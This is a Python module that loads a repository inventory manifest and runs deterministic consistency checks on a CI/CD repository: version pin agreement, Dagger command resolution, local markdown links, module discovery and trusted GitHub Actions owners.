"""
The defended repository surface — inventory loader plus the checks that keep the
inventory honest.

Everything here is deterministic and offline: it reads scripts/repo-inventory.json
and files already in the working tree. Nothing resolves a remote tag, queries a
registry, or shells out to dagger.

Why this exists
---------------
Before this module, two hand-maintained lists described "the files we manage":
one inside scripts/_pin_targets.py for the release bumper, one implied by
whichever paths a check happened to glob. Both silently skipped paths that did
not exist. The consequences were shipped:

  * .github/workflows/ froze at v0.2.0 while every other pin moved to v1.0.0,
    because the bumper never touched workflow files and nothing enforced it;
  * nine module READMEs are still pinned at v1.0.0 because they were never in
    the managed list at all;
  * an inventory entry survived for templates/azure-devops/commit-archive.yml
    after the file was deleted — `if not path.exists(): continue` turned a
    deleted managed surface into a pass;
  * a reusable workflow shipped calling `run-archive` against a composite whose
    pinned version had no such command.

So: one inventory, missing paths are errors, and discovery proves the inventory
is complete rather than merely self-consistent.

Check surface (each returns a list of human-readable problem strings; empty means
clean, so callers can aggregate):

  check_declared_paths_exist  every declared path resolves to a real file
  check_module_inventory      declared modules == discovered dagger.json dirs,
                              and the schema/contract subsets are real subsets
  check_undeclared_markdown   no active markdown hides outside the inventory
  check_pin_consistency       every context-and-oss/cicd pin agrees on one version
  check_dagger_commands       every `call <cmd>` against a module in this repo
                              resolves to an exported Go method
  check_local_links           every local markdown link resolves
  check_pending_pin_repairs   every pin_guard.pending_repairs entry still names a
                              pin that actually lags, so the tolerance list cannot
                              silently outlive the drift it excuses

check_pin_consistency and check_dagger_commands accept extra keyword arguments
used only by the CI-blocking gate (scripts/check-workflow-pins.py), which must
stay green against surfaces this brief newly started scanning until a later
brief repairs them:

  tolerate_pending  check_pin_consistency: skip files listed in
                    pin_guard.pending_repairs (an explicit, reasoned, self-
                    expiring exemption — never a silent skip)
  resolve_local     check_dagger_commands: when False, resolve only the pinned
                    remote call form, matching the gate's historical scope.
                    check_repo_surface.py (the canonical, non-blocking checker)
                    always resolves both and never tolerates pending pins.

`check_all` runs the lot. `load_inventory` refuses a manifest that would make the
checks vacuous — an empty module list or an empty active surface is a bug in the
inventory, not a clean repository.
"""
from __future__ import annotations

import hashlib
import json
import pathlib
import re
import subprocess
import sys
from dataclasses import dataclass, field

INVENTORY_FILENAME = "repo-inventory.json"

# --- pin shapes -------------------------------------------------------------
# Scoped to context-and-oss/cicd so unrelated examples (`shared-models@v1.2.3` in a
# consumer snippet) are left alone.
#
#   github.com/context-and-oss/cicd/<path>@v<X.Y.Z>             module reference
#   context-and-oss/cicd/.github/workflows/<file>.yml@v<X.Y.Z>  reusable workflow ref
#   context-and-oss/cicd/.github/actions/<name>@v<X.Y.Z>        composite action ref
#
# A shape missing here is a pin nothing reads: the bumper never moves it and the
# skew check never sees it lag, so it reads as current while naming an old release.
PIN_REWRITE_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"(github\.com/context-and-oss/cicd/[A-Za-z0-9/_\-]+@v)\d+\.\d+\.\d+"), r"\g<1>{v}"),
    (re.compile(r"(context-and-oss/cicd/\.github/workflows/[A-Za-z0-9_\-]+\.yml@v)\d+\.\d+\.\d+"), r"\g<1>{v}"),
    (re.compile(r"(context-and-oss/cicd/\.github/actions/[A-Za-z0-9_\-]+@v)\d+\.\d+\.\d+"), r"\g<1>{v}"),
]

# Captures every pinned version token in an active surface. Group 1 = the X.Y.Z.
VERSION_SCAN = re.compile(
    r"(?:github\.com/context-and-oss/cicd/[A-Za-z0-9/_\-]+"
    r"|context-and-oss/cicd/\.github/workflows/[A-Za-z0-9_\-]+\.yml"
    r"|context-and-oss/cicd/\.github/actions/[A-Za-z0-9_\-]+)@v(\d+\.\d+\.\d+)"
)

# `dagger ... -m github.com/context-and-oss/cicd/<path>@v<ver> call <cmd>`
REMOTE_CALL_SCAN = re.compile(
    r"-m\s+github\.com/context-and-oss/cicd/(?P<path>[A-Za-z0-9/_\-]+)@v\d+\.\d+\.\d+"
    r"\s+call\s+(?P<cmd>[a-z][a-z0-9\-]*)"
)

# `dagger ... -m ./src/<path> call <cmd>` — the local form used by contributor
# docs. Consumer examples such as `-m ./ci call pr-gate` point at the reader's
# own module and are deliberately not matched.
LOCAL_CALL_SCAN = re.compile(
    r"-m\s+\.?/?(?P<path>src/[A-Za-z0-9/_\-]+)\s+call\s+(?P<cmd>[a-z][a-z0-9\-]*)"
)

# Inline markdown links and images: [text](target) / ![alt](target).
MD_LINK_SCAN = re.compile(r"!?\[[^\]]*\]\(\s*<?(?P<target>[^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)")

# Schemes and shapes that are not local paths.
_NON_LOCAL_LINK = re.compile(r"^(?:[a-z][a-z0-9+.\-]*:|//|#|mailto:)", re.IGNORECASE)

# Only files whose text we treat as prose/config worth scanning for pins,
# commands and links. Binary assets are existence-checked but never read.
_TEXT_SUFFIXES = {".md", ".yml", ".yaml", ".json", ".sh", ".py", ""}


class InventoryError(Exception):
    """The manifest itself is unusable — malformed, or so empty it proves nothing."""


@dataclass(frozen=True)
class Inventory:
    root: pathlib.Path
    modules: tuple[str, ...]
    schema_modules: tuple[str, ...]
    schema_synced_modules: tuple[str, ...]
    contract_modules: tuple[str, ...]
    surface_groups: dict[str, tuple[str, ...]]
    default_scope_groups: tuple[str, ...]
    workflow_scope_groups: tuple[str, ...]
    historical_exclusions: tuple[str, ...]
    module_root: str
    module_marker: str
    markdown_roots: tuple[tuple[str, bool], ...] = field(default=())
    pin_guard_pending_repairs: tuple[tuple[str, str], ...] = field(default=())
    workflow_trusted_owners: tuple[str, ...] = field(default=())
    workflow_third_party_actions: tuple[tuple[str, str], ...] = field(default=())
    workflow_surface_groups: tuple[str, ...] = field(default=())
    synced_files: tuple[tuple[str, tuple[str, ...], str], ...] = field(default=())
    generated_files: tuple[tuple[str, str, str, tuple[str, ...]], ...] = field(default=())
    composite_reach_groups: tuple[str, ...] = field(default=())
    composite_reach_unreachable: tuple[tuple[str, str, str], ...] = field(default=())
    composite_reach_unreadable: tuple[tuple[str, str], ...] = field(default=())
    guarded_flag_groups: tuple[str, ...] = field(default=())
    guarded_flags: tuple[tuple[str, str, str], ...] = field(default=())

    @property
    def active_surfaces(self) -> tuple[str, ...]:
        """Every declared active surface, deduplicated, in stable order."""
        seen: dict[str, None] = {}
        for group in sorted(self.surface_groups):
            for rel in self.surface_groups[group]:
                seen.setdefault(rel, None)
        return tuple(seen)

    def group_paths(self, groups: tuple[str, ...]) -> tuple[str, ...]:
        seen: dict[str, None] = {}
        for group in groups:
            for rel in self.surface_groups[group]:
                seen.setdefault(rel, None)
        return tuple(seen)

    @property
    def pin_rewrite_default_targets(self) -> tuple[str, ...]:
        """Surfaces the default GITHUB_TOKEN may push."""
        return self.group_paths(self.default_scope_groups)

    @property
    def pin_rewrite_workflow_targets(self) -> tuple[str, ...]:
        """Surfaces needing a push credential with the `workflow` scope."""
        return self.group_paths(self.workflow_scope_groups)

    @property
    def pending_pin_repair_paths(self) -> tuple[str, ...]:
        return tuple(rel for rel, _reason in self.pin_guard_pending_repairs)

    def is_historical(self, rel: str) -> bool:
        posix = pathlib.PurePosixPath(rel).as_posix()
        return any(
            posix == excl or posix.startswith(excl.rstrip("/") + "/")
            for excl in self.historical_exclusions
        )


def default_inventory_path() -> pathlib.Path:
    return pathlib.Path(__file__).resolve().parent / INVENTORY_FILENAME


def default_root() -> pathlib.Path:
    return pathlib.Path(__file__).resolve().parent.parent


def _str_list(data: dict, key: str, *, where: str) -> tuple[str, ...]:
    value = data.get(key, [])
    if not isinstance(value, list) or not all(isinstance(v, str) for v in value):
        raise InventoryError(f"{where}: '{key}' must be a list of strings")
    return tuple(value)


def load_inventory(
    inventory_path: pathlib.Path | str | None = None,
    root: pathlib.Path | str | None = None,
) -> Inventory:
    """Read and validate the manifest.

    Raises InventoryError if the manifest is malformed, or if it declares no
    modules or no active surfaces — a checker that "passes" against an empty
    inventory proves nothing, so refusing it is part of the guarantee.
    """
    path = pathlib.Path(inventory_path) if inventory_path else default_inventory_path()
    base = pathlib.Path(root) if root else path.resolve().parent.parent
    where = str(path)

    try:
        raw = json.loads(path.read_text())
    except FileNotFoundError as exc:
        raise InventoryError(f"{where}: inventory manifest not found") from exc
    except json.JSONDecodeError as exc:
        raise InventoryError(f"{where}: not valid JSON — {exc}") from exc
    if not isinstance(raw, dict):
        raise InventoryError(f"{where}: top level must be an object")

    surfaces_raw = raw.get("active_surfaces", {})
    if not isinstance(surfaces_raw, dict):
        raise InventoryError(f"{where}: 'active_surfaces' must be an object of groups")
    groups: dict[str, tuple[str, ...]] = {}
    for name, value in surfaces_raw.items():
        if name.startswith("$"):
            continue
        if not isinstance(value, list) or not all(isinstance(v, str) for v in value):
            raise InventoryError(f"{where}: active_surfaces['{name}'] must be a list of strings")
        groups[name] = tuple(value)

    modules = _str_list(raw, "modules", where=where)
    if not modules:
        raise InventoryError(
            f"{where}: 'modules' is empty — an inventory that declares no module "
            f"cannot defend anything"
        )
    if not any(groups.values()):
        raise InventoryError(
            f"{where}: 'active_surfaces' declares no path — an inventory that "
            f"declares no active surface cannot defend anything"
        )

    rewrite = raw.get("pin_rewrite", {})
    if not isinstance(rewrite, dict):
        raise InventoryError(f"{where}: 'pin_rewrite' must be an object")
    default_groups = _str_list(rewrite, "default_scope_groups", where=where)
    workflow_groups = _str_list(rewrite, "workflow_scope_groups", where=where)
    for name in default_groups + workflow_groups:
        if name not in groups:
            raise InventoryError(
                f"{where}: pin_rewrite names unknown surface group '{name}'"
            )
    overlap = sorted(set(default_groups) & set(workflow_groups))
    if overlap:
        raise InventoryError(
            f"{where}: pin_rewrite groups {overlap} are in both scopes — a file "
            f"cannot need and not need the workflow push scope"
        )

    exclusions_raw = raw.get("historical_exclusions", [])
    if not isinstance(exclusions_raw, list):
        raise InventoryError(f"{where}: 'historical_exclusions' must be a list")
    exclusions: list[str] = []
    for entry in exclusions_raw:
        if not isinstance(entry, dict) or not isinstance(entry.get("path"), str):
            raise InventoryError(
                f"{where}: each historical_exclusions entry needs a string 'path'"
            )
        if not isinstance(entry.get("reason"), str) or not entry["reason"].strip():
            raise InventoryError(
                f"{where}: historical exclusion '{entry['path']}' needs a 'reason' — "
                f"exclusions are explicit and narrow, never silent"
            )
        exclusions.append(entry["path"].rstrip("/"))

    pin_guard = raw.get("pin_guard", {})
    if not isinstance(pin_guard, dict):
        raise InventoryError(f"{where}: 'pin_guard' must be an object")
    pending_raw = pin_guard.get("pending_repairs", [])
    if not isinstance(pending_raw, list):
        raise InventoryError(f"{where}: 'pin_guard.pending_repairs' must be a list")
    pending: list[tuple[str, str]] = []
    seen_pending: set[str] = set()
    for entry in pending_raw:
        if not isinstance(entry, dict) or not isinstance(entry.get("path"), str):
            raise InventoryError(
                f"{where}: each pin_guard.pending_repairs entry needs a string 'path'"
            )
        if not isinstance(entry.get("reason"), str) or not entry["reason"].strip():
            raise InventoryError(
                f"{where}: pin_guard.pending_repairs entry '{entry['path']}' needs a "
                f"'reason' — tolerated drift is explicit, never silent"
            )
        rel = entry["path"]
        if rel not in {r for g in groups.values() for r in g}:
            raise InventoryError(
                f"{where}: pin_guard.pending_repairs names '{rel}', which is not a "
                f"declared active surface"
            )
        if rel in seen_pending:
            raise InventoryError(
                f"{where}: pin_guard.pending_repairs names '{rel}' more than once"
            )
        seen_pending.add(rel)
        pending.append((rel, entry["reason"]))

    actions_raw = raw.get("workflow_actions", {})
    if not isinstance(actions_raw, dict):
        raise InventoryError(f"{where}: 'workflow_actions' must be an object")
    trusted_owners = _str_list(actions_raw, "trusted_owners", where=where)
    action_groups = _str_list(actions_raw, "workflow_groups", where=where)
    for name in action_groups:
        if name not in groups:
            raise InventoryError(
                f"{where}: workflow_actions names unknown surface group '{name}'"
            )
    if trusted_owners and not action_groups:
        raise InventoryError(
            f"{where}: workflow_actions declares trusted owners but no "
            f"'workflow_groups' to check — a guard with nothing in scope passes "
            f"vacuously"
        )
    third_party: list[tuple[str, str]] = []
    allowed_raw = actions_raw.get("third_party_allowed", [])
    if not isinstance(allowed_raw, list):
        raise InventoryError(
            f"{where}: 'workflow_actions.third_party_allowed' must be a list"
        )
    for entry in allowed_raw:
        if not isinstance(entry, dict) or not isinstance(entry.get("action"), str):
            raise InventoryError(
                f"{where}: each workflow_actions.third_party_allowed entry needs a "
                f"string 'action'"
            )
        if not isinstance(entry.get("reason"), str) or not entry["reason"].strip():
            raise InventoryError(
                f"{where}: third_party_allowed entry '{entry['action']}' needs a "
                f"'reason' — an action that can stop every pipeline from starting "
                f"is admitted explicitly, never silently"
            )
        third_party.append((entry["action"], entry["reason"]))

    reach_raw = raw.get("composite_reach", {})
    if not isinstance(reach_raw, dict):
        raise InventoryError(f"{where}: 'composite_reach' must be an object")
    reach_groups = _str_list(reach_raw, "surface_groups", where=where)
    for name in reach_groups:
        if name not in groups:
            raise InventoryError(
                f"{where}: composite_reach.surface_groups names '{name}', which is "
                f"not an active_surfaces group"
            )
    reach_unreachable: list[tuple[str, str, str]] = []
    unreachable_raw = reach_raw.get("unreachable", [])
    if not isinstance(unreachable_raw, list):
        raise InventoryError(f"{where}: 'composite_reach.unreachable' must be a list")
    for entry in unreachable_raw:
        if not isinstance(entry, dict) or not isinstance(entry.get("param"), str):
            raise InventoryError(
                f"{where}: each composite_reach.unreachable entry needs a string 'param'"
            )
        entry_sites = entry.get("sites")
        if not isinstance(entry_sites, list) or not entry_sites or not all(
            isinstance(s, str) for s in entry_sites
        ):
            raise InventoryError(
                f"{where}: composite_reach.unreachable entry '{entry['param']}' needs a "
                f"non-empty 'sites' list of strings"
            )
        if not isinstance(entry.get("reason"), str) or not entry["reason"].strip():
            raise InventoryError(
                f"{where}: composite_reach.unreachable entry '{entry['param']}' needs a "
                f"'reason' — a knob a consumer cannot reach is admitted explicitly, "
                f"never by omission"
            )
        for site in entry_sites:
            reach_unreachable.append((entry["param"], site, entry["reason"]))
    reach_unreadable: list[tuple[str, str]] = []
    unreadable_raw = reach_raw.get("unreadable_sites", [])
    if not isinstance(unreadable_raw, list):
        raise InventoryError(f"{where}: 'composite_reach.unreadable_sites' must be a list")
    for entry in unreadable_raw:
        if not isinstance(entry, dict) or not isinstance(entry.get("path"), str):
            raise InventoryError(
                f"{where}: each composite_reach.unreadable_sites entry needs a string 'path'"
            )
        if not isinstance(entry.get("reason"), str) or not entry["reason"].strip():
            raise InventoryError(
                f"{where}: composite_reach.unreadable_sites entry '{entry['path']}' needs "
                f"a 'reason' — a surface this check cannot read is named, not skipped"
            )
        reach_unreadable.append((entry["path"], entry["reason"]))

    discovery = raw.get("discovery", {})
    if not isinstance(discovery, dict):
        raise InventoryError(f"{where}: 'discovery' must be an object")
    module_root = discovery.get("module_root", "src")
    module_marker = discovery.get("module_marker", "dagger.json")
    if not isinstance(module_root, str) or not isinstance(module_marker, str):
        raise InventoryError(f"{where}: discovery.module_root/module_marker must be strings")

    md_roots: list[tuple[str, bool]] = []
    for entry in discovery.get("markdown_roots", []):
        if not isinstance(entry, dict) or not isinstance(entry.get("path"), str):
            raise InventoryError(
                f"{where}: each discovery.markdown_roots entry needs a string 'path'"
            )
        md_roots.append((entry["path"], bool(entry.get("recursive", True))))

    synced: list[tuple[str, tuple[str, ...], str]] = []
    for entry in raw.get("synced_files", []):
        if not isinstance(entry, dict):
            raise InventoryError(f"{where}: each synced_files entry must be an object")
        paths = entry.get("paths")
        reason = entry.get("reason", "")
        if not isinstance(reason, str) or not reason.strip():
            raise InventoryError(
                f"{where}: each synced_files entry needs a non-empty 'reason' — a "
                f"copy nobody wrote down a reason for is a copy nobody will keep"
            )
        if not isinstance(paths, list) or len(paths) < 2 or not all(
            isinstance(x, str) and x.strip() for x in paths
        ):
            raise InventoryError(
                f"{where}: each synced_files entry needs a 'paths' list of at "
                f"least two file paths"
            )
        may_differ_by = entry.get("may_differ_by", "")
        if may_differ_by not in SYNCED_ALLOWED_DIFFERENCES:
            raise InventoryError(
                f"{where}: synced_files 'may_differ_by' is {may_differ_by!r}; the "
                f"only declared difference is "
                f"{', '.join(repr(k) for k in SYNCED_ALLOWED_DIFFERENCES if k)} — "
                f"a copy allowed to differ by anything else is not a copy"
            )
        synced.append((reason.strip(), tuple(paths), may_differ_by))

    generated: list[tuple[str, str, str, tuple[str, ...]]] = []
    for entry in raw.get("generated_files", []):
        if not isinstance(entry, dict):
            raise InventoryError(f"{where}: each generated_files entry must be an object")
        gen = entry.get("generator")
        source = entry.get("source")
        reason = entry.get("reason", "")
        paths = entry.get("paths")
        if not all(isinstance(x, str) and x.strip() for x in (gen, source, reason)):
            raise InventoryError(
                f"{where}: each generated_files entry needs non-empty 'generator', "
                f"'source' and 'reason' strings"
            )
        if not isinstance(paths, list) or not paths or not all(
            isinstance(x, str) and x.strip() for x in paths
        ):
            raise InventoryError(
                f"{where}: each generated_files entry needs a non-empty 'paths' list"
            )
        generated.append((reason.strip(), gen.strip(), source.strip(), tuple(paths)))

    guarded_raw = raw.get("guarded_flags", {})
    if not isinstance(guarded_raw, dict):
        raise InventoryError(f"{where}: 'guarded_flags' must be an object")
    guarded_groups = tuple(_str_list(guarded_raw, "surface_groups", where=where))
    for group in guarded_groups:
        if group not in groups:
            raise InventoryError(
                f"{where}: guarded_flags.surface_groups names '{group}', which is "
                f"not an active_surfaces group"
            )
    guarded: list[tuple[str, str, str]] = []
    for entry in guarded_raw.get("flags", []):
        if not isinstance(entry, dict):
            raise InventoryError(f"{where}: each guarded_flags.flags entry must be an object")
        flag = entry.get("flag")
        variable = entry.get("variable")
        reason = entry.get("reason", "")
        if not all(isinstance(x, str) and x.strip() for x in (flag, variable, reason)):
            raise InventoryError(
                f"{where}: each guarded_flags.flags entry needs non-empty 'flag', "
                f"'variable' and 'reason' strings — a guard nobody wrote a reason "
                f"for is a guard the next reader will delete"
            )
        guarded.append((flag.strip().lstrip("-"), variable.strip(), reason.strip()))

    return Inventory(
        root=base,
        modules=modules,
        schema_modules=_str_list(raw, "schema_modules", where=where),
        schema_synced_modules=_str_list(raw, "schema_synced_modules", where=where),
        contract_modules=_str_list(raw, "contract_modules", where=where),
        surface_groups=groups,
        default_scope_groups=default_groups,
        workflow_scope_groups=workflow_groups,
        historical_exclusions=tuple(exclusions),
        pin_guard_pending_repairs=tuple(pending),
        workflow_trusted_owners=trusted_owners,
        workflow_third_party_actions=tuple(third_party),
        workflow_surface_groups=action_groups,
        module_root=module_root,
        module_marker=module_marker,
        markdown_roots=tuple(md_roots),
        synced_files=tuple(synced),
        generated_files=tuple(generated),
        composite_reach_groups=reach_groups,
        composite_reach_unreachable=tuple(reach_unreachable),
        composite_reach_unreadable=tuple(reach_unreadable),
        guarded_flag_groups=guarded_groups,
        guarded_flags=tuple(guarded),
    )


# --- helpers ----------------------------------------------------------------


def kebab_to_method(cmd: str) -> str:
    """`scan-source` -> `ScanSource`, matching Dagger's Go name mangling."""
    return "".join(part.capitalize() for part in cmd.split("-"))


def _readable(path: pathlib.Path) -> bool:
    return path.is_file() and path.suffix.lower() in _TEXT_SUFFIXES


def logical_lines(text: str) -> list[tuple[int, str]]:
    """Join shell backslash continuations into one logical line.

    Returned line numbers point at the first physical line, which is where a
    reader looks. Without this, a command split as

        dagger -m ./src/quality \\
          call check \\

    would slip past a per-physical-line scan — exactly the kind of silent skip
    this module exists to remove.
    """
    out: list[tuple[int, str]] = []
    buf: list[str] = []
    start = 0
    for lineno, line in enumerate(text.splitlines(), 1):
        stripped = line.rstrip()
        if not buf:
            start = lineno
        if stripped.endswith("\\"):
            buf.append(stripped[:-1])
            continue
        buf.append(stripped)
        out.append((start, " ".join(part.strip() for part in buf).strip()))
        buf = []
    if buf:
        out.append((start, " ".join(part.strip() for part in buf).strip()))
    return out


def discover_modules(inv: Inventory) -> list[str]:
    """Every directory under discovery.module_root holding a module marker."""
    src = inv.root / inv.module_root
    if not src.is_dir():
        return []
    found = {
        marker.parent.relative_to(inv.root).as_posix()
        for marker in src.rglob(inv.module_marker)
    }
    return sorted(found)


def discover_active_markdown(inv: Inventory) -> list[str]:
    """Markdown under the discovery roots, minus historical exclusions."""
    found: set[str] = set()
    for root_rel, recursive in inv.markdown_roots:
        base = inv.root if root_rel in (".", "") else inv.root / root_rel
        if not base.is_dir():
            continue
        for md in base.rglob("*.md") if recursive else base.glob("*.md"):
            rel = md.relative_to(inv.root).as_posix()
            if not inv.is_historical(rel):
                found.add(rel)
    return sorted(found)


# --- checks -----------------------------------------------------------------


def check_declared_paths_exist(inv: Inventory) -> list[str]:
    """A declared path that does not exist is an error, never a skip."""
    problems: list[str] = []
    for group in sorted(inv.surface_groups):
        for rel in inv.surface_groups[group]:
            path = inv.root / rel
            if not path.exists():
                problems.append(
                    f"missing managed path: {rel} (declared in active_surfaces."
                    f"{group}) — delete the inventory entry or restore the file"
                )
            elif not path.is_file():
                problems.append(
                    f"managed path is not a file: {rel} (declared in "
                    f"active_surfaces.{group})"
                )
    return problems


def check_module_inventory(inv: Inventory) -> list[str]:
    """Declared modules and discovered module directories must agree exactly."""
    problems: list[str] = []

    duplicates = sorted({m for m in inv.modules if inv.modules.count(m) > 1})
    for rel in duplicates:
        problems.append(f"module declared more than once: {rel}")

    discovered = set(discover_modules(inv))
    declared = set(inv.modules)
    for rel in sorted(discovered - declared):
        problems.append(
            f"undeclared Dagger module: {rel} has {inv.module_marker} but is not "
            f"in the inventory's 'modules'"
        )
    for rel in sorted(declared - discovered):
        problems.append(
            f"declared module has no {inv.module_marker}: {rel} — the inventory "
            f"claims a module that does not exist"
        )

    for name, subset, marker in (
        ("schema_modules", inv.schema_modules, "schema.go"),
        ("schema_synced_modules", inv.schema_synced_modules, "schema.go"),
        ("contract_modules", inv.contract_modules, "contract.json"),
    ):
        for rel in subset:
            if rel not in declared:
                problems.append(f"{name} lists '{rel}', which is not a declared module")
            elif not (inv.root / rel / marker).is_file():
                problems.append(f"{name} lists '{rel}' but {rel}/{marker} is missing")

    for rel in sorted(set(inv.schema_synced_modules) - set(inv.schema_modules)):
        problems.append(
            f"schema_synced_modules lists '{rel}', which is not in schema_modules — "
            f"a module cannot have its schema copy regenerated without holding one"
        )
    # Discovery in the other direction: a marker present but undeclared means the
    # Makefile target that consumes the list would quietly skip that module.
    for name, subset, marker, consequence in (
        ("schema_modules", inv.schema_modules, "schema.go", "make sync-schema would leave it behind"),
        ("contract_modules", inv.contract_modules, "contract.json", "make verify-contracts would skip it"),
    ):
        for rel in inv.modules:
            if rel in subset or not (inv.root / rel / marker).is_file():
                continue
            problems.append(
                f"undeclared {marker}: {rel}/{marker} exists but {rel} is not in "
                f"{name} — {consequence}"
            )
    return problems


def check_undeclared_markdown(inv: Inventory) -> list[str]:
    """Active markdown must be declared, or explicitly historical."""
    declared = set(inv.active_surfaces)
    return [
        f"undeclared active document: {rel} — add it to active_surfaces or, if it "
        f"is planning/history, to historical_exclusions with a reason"
        for rel in discover_active_markdown(inv)
        if rel not in declared
    ]


def check_pin_consistency(inv: Inventory, *, tolerate_pending: bool = False) -> list[str]:
    """Every context-and-oss/cicd pin in an active surface points at one version.

    Enforced by equality across files rather than against the latest git tag: a
    release commit rewrites pins to the next version before that tag exists, so a
    tag check would red-flag the release itself.

    tolerate_pending skips files listed in pin_guard.pending_repairs — used only
    by the CI-blocking gate (scripts/check-workflow-pins.py) so it stays green
    against drift a later brief repairs. The canonical checker never sets it.
    """
    pending = set(inv.pending_pin_repair_paths) if tolerate_pending else set()
    seen: dict[str, list[str]] = {}
    for rel in inv.active_surfaces:
        if rel in pending:
            continue
        path = inv.root / rel
        if not _readable(path):
            continue
        for lineno, line in enumerate(path.read_text().splitlines(), 1):
            for ver in VERSION_SCAN.findall(line):
                seen.setdefault(ver, []).append(f"{rel}:{lineno}")
    if len(seen) <= 1:
        return []

    majority = max(sorted(seen), key=lambda v: len(seen[v]))
    problems = [
        f"pin version skew: expected v{majority} (used by {len(seen[majority])} "
        f"pins), but these reference other versions:"
    ]
    for ver in sorted(seen):
        if ver == majority:
            continue
        problems.extend(f"  {loc}  ->  v{ver}" for loc in seen[ver])
    return problems


_PIN_SKEW_LOC = re.compile(r"^  (?P<rel>.+):\d+  ->  v")


def check_pending_pin_repairs(inv: Inventory) -> list[str]:
    """Every pin_guard.pending_repairs entry must still name a pin that lags.

    Self-expiring by construction: check_pin_consistency(tolerate_pending=True)
    is how the CI-blocking gate stays green, so a stale entry would quietly keep
    excusing a file that no longer needs the excuse — the exact silent-skip
    failure mode this module exists to remove, just relocated to a tolerance
    list instead of a managed-path list.
    """
    still_lagging: set[str] = set()
    for problem in check_pin_consistency(inv, tolerate_pending=False):
        match = _PIN_SKEW_LOC.match(problem)
        if match:
            still_lagging.add(match.group("rel"))
    return [
        f"pin_guard.pending_repairs names '{rel}', but its pin no longer lags — "
        f"remove the entry (reason recorded: {reason})"
        for rel, reason in inv.pin_guard_pending_repairs
        if rel not in still_lagging
    ]


def _module_has_method(inv: Inventory, mod_rel: str, method: str) -> bool:
    needle = f") {method}("
    return any(go.read_text().find(needle) >= 0 for go in (inv.root / mod_rel).glob("*.go"))


def check_dagger_commands(inv: Inventory, *, resolve_local: bool = True) -> list[str]:
    """Every `call <cmd>` against a module in this repo must exist in its source.

    Under the monorepo single-tag model the source at HEAD is what ships at the
    next tag, so resolving against HEAD guarantees a documented command is not
    one the pinned module will reject. Both the pinned remote form and the local
    `./src/...` contributor form are checked; a local reference outside src/ is a
    consumer's own module and is left alone.

    resolve_local=False restricts resolution to the pinned remote form only —
    the CI-blocking gate's historical scope (scripts/check-workflow-pins.py),
    kept narrow so this brief does not newly fail a gate that ci.yml and
    cd.yml's release step both depend on. The canonical checker always resolves
    both forms.
    """
    scans = (REMOTE_CALL_SCAN, LOCAL_CALL_SCAN) if resolve_local else (REMOTE_CALL_SCAN,)
    problems: list[str] = []
    for rel in inv.active_surfaces:
        path = inv.root / rel
        if not _readable(path):
            continue
        for lineno, line in logical_lines(path.read_text()):
            for scan in scans:
                for match in scan.finditer(line):
                    mod_rel, cmd = match.group("path"), match.group("cmd")
                    if not (inv.root / mod_rel).is_dir():
                        problems.append(
                            f"{rel}:{lineno}  references unknown module path '{mod_rel}'"
                        )
                        continue
                    method = kebab_to_method(cmd)
                    if not _module_has_method(inv, mod_rel, method):
                        problems.append(
                            f"{rel}:{lineno}  calls unknown command '{cmd}' on module "
                            f"'{mod_rel}' — no exported {method}() in its source, so "
                            f"the pinned version would reject it"
                        )
    return problems


def check_local_links(inv: Inventory) -> list[str]:
    """Every local markdown link in an active surface must resolve."""
    problems: list[str] = []
    for rel in inv.active_surfaces:
        path = inv.root / rel
        if path.suffix.lower() != ".md" or not path.is_file():
            continue
        for lineno, line in enumerate(path.read_text().splitlines(), 1):
            for match in MD_LINK_SCAN.finditer(line):
                target = match.group("target").strip()
                if not target or _NON_LOCAL_LINK.match(target):
                    continue
                if any(ch in target for ch in "{}$"):
                    continue  # templated placeholder, not a path
                bare = target.split("#", 1)[0].split("?", 1)[0]
                if not bare:
                    continue
                resolved = (
                    inv.root / bare.lstrip("/")
                    if bare.startswith("/")
                    else path.parent / bare
                )
                try:
                    resolved = resolved.resolve()
                    resolved.relative_to(inv.root.resolve())
                except ValueError:
                    problems.append(
                        f"{rel}:{lineno}  link '{target}' escapes the repository"
                    )
                    continue
                if not resolved.exists():
                    problems.append(f"{rel}:{lineno}  broken local link '{target}'")
    return problems


def check_workflow_actions_trusted(inv: Inventory) -> list[str]:
    """Every action a declared workflow uses must be permitted to even start.

    The intended trust boundary is a selected Actions policy with explicit
    trusted owners and documented exceptions. A disallowed action can prevent
    a run from starting, with no check run to signal failure; a source-era
    outage exposed that failure mode. This source check models the manifest's
    intended boundary. It does not query or establish destination settings.

    So the owner is checked here rather than trusted to fail loudly later.
    Trusted owners come from the manifest; anything else needs an explicit
    third_party_allowed entry with a reason, which forces whoever adds one to
    confirm the policy actually permits it. Local actions (`./...`) and
    same-repository reusable workflows are always permitted by GitHub and need
    no declaration.
    """
    problems: list[str] = []
    allowed = {name for name, _reason in inv.workflow_third_party_actions}
    for rel in inv.group_paths(inv.workflow_surface_groups):
        path = inv.root / rel
        if not path.is_file():
            continue  # check_declared_paths_exist owns missing files
        for lineno, line in enumerate(path.read_text().splitlines(), 1):
            stripped = line.strip()
            # A YAML key, never a commented usage example — the reusable
            # workflows document their own call site in a `#  uses:` comment.
            if not (stripped.startswith("uses:") or stripped.startswith("- uses:")):
                continue
            ref = stripped.split("uses:", 1)[1].split("#", 1)[0].strip()
            if not ref or ref.startswith("./") or ref.startswith("docker://"):
                continue
            owner, _, rest = ref.partition("/")
            if not rest:
                continue
            action = f"{owner}/{rest.split('@', 1)[0].split('/', 1)[0]}"
            if owner in inv.workflow_trusted_owners or action in allowed:
                continue
            problems.append(
                f"{rel}:{lineno}  '{action}' is not a trusted action owner "
                f"({', '.join(sorted(inv.workflow_trusted_owners))}) and is not "
                f"declared in workflow_actions.third_party_allowed. Under the "
                f"intended `selected` Actions policy an undeclared action "
                f"fails the whole run at startup, publishing no check run at all "
                f"— the pipeline goes silently dead rather than red. Replace it "
                f"with a pinned local step, or declare it with a reason once the "
                f"policy allows it."
            )
    return problems


# A `run:` body above roughly 24 KB as written (~20.5 KB of script after
# dedenting) makes GitHub refuse the workflow at startup. Measured on this
# repository in 2026-08 by pushing ci.yml at increasing step sizes and reading
# back whether a run appeared at all: 24,035 B started, 24,519 B did not, and
# the difference was 6 lines of shell *comment* — so the trigger is size, not
# content. The budget below is the largest step we are willing to ship, chosen
# to leave several KB of headroom under the lowest size ever observed to fail,
# because the exact ceiling is undocumented and could move.
STEP_RUN_BUDGET_BYTES = 16384

_RUN_BLOCK_RE = re.compile(r"^(?P<lead>\s*(?:-\s+)?)run:\s*[|>][-+]?\d*\s*(?:#.*)?$")


